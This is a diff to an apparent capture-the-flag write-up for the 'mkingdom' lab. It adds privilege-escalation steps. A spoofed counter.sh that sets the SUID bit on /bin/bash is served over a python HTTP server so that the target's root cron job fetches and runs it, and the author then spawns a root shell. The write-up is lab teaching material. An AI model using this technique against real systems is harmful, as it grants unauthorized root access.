@@ -125,5 +125,35 @@ The modified /etc/hosts file should look like this except with the mkingdom IP p
 
 ![modified _etc_hosts](https://github.com/user-attachments/assets/2e6104b5-5c7b-4551-8bd0-f86e186fc22c)
 
-Next, on our attack box, create a script replicating counter.sh complete with the file path:
+Next, on our attack box, create a script replicating counter.sh complete with the file path. 
+First, create the directory:
+```bash
+mkdir -p /tmp/app/castle/application
+```
+Then create a bash script for counter.sh. This script will set the SUID bit on /bin/bash binary:
+```bash
+#! /bin/bash/env bash
 
+chmod 4755 /bin/bash
+```
+Then set up the sever on port 85 directing to our counterfit counter.sh:
+```bash
+sudo python3 -m http.server 85 --directory /tmp
+```
+
+![server_counter sh](https://github.com/user-attachments/assets/8bb05441-3bf7-4078-8fa3-6223e52caa14)
+
+Now we should see the cron job coming from our target IP making a GET request to our counter.sh with a 200 status.
+
+Then as mario, we can run this command to check the /bin/bash:
+```bash
+ls -l /bin/bash
+```
+Then, run this command as mario to bash with the SUID privileges:
+```bash
+/bin/bash -ip
+```
+
+![cat_root txt](https://github.com/user-attachments/assets/3f5a0cc5-0c26-43c9-8254-615f495f2dbc)
+
+And we are now root!
